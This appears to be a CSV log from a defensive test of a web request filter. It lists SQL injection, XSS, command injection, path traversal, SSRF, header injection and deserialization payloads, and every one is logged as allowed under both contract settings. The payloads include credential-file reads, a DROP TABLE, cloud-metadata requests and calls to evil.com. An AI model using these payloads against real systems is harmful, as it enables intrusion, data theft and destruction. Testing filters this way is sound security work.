timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T16:34:48.450867,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.456808,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.563230,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.565407,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.668590,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.673956,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.781704,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.789573,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.898345,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:48.904690,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.009149,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.016159,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.125788,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.131625,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.236943,SQLi,Authentication Bypass,admin'--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.243354,SQLi,Authentication Bypass,admin'--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.352339,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.359177,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.468203,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.474760,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.583855,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.586854,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.694148,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.703063,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.811887,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.818876,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.928320,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:49.935629,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.045167,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.052149,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.160302,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.167233,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.276526,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.284011,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.389760,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.396205,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.505104,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.512230,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.621592,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.625828,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.734002,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Cmd Injection Pipe Bypass"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.740961,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Cmd Injection Pipe Bypass"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.847837,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.854568,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.960811,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:50.968054,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.077039,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Cmd Injection Pipe Bypass"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.084066,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Cmd Injection Pipe Bypass"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.193583,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.201150,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.310419,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.317530,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.427036,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.433562,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.542635,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.549831,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.659026,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.665571,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.774184,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.781373,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.889465,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:51.896383,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.001965,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.009127,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.118476,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.125376,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal/Absolute"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.235310,SSRF,Localhost,http://localhost/admin,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.241911,SSRF,Localhost,http://localhost/admin,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.347760,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.354536,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.464228,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.471241,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.576973,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.583503,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.692783,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.699696,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Private IP"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.808652,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.816927,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.926233,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:52.933235,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.039438,Deserialization,Java RMI Header,JRMI,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.046242,Deserialization,Java RMI Header,JRMI,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.152455,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.159549,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.268611,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T16:34:53.275874,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
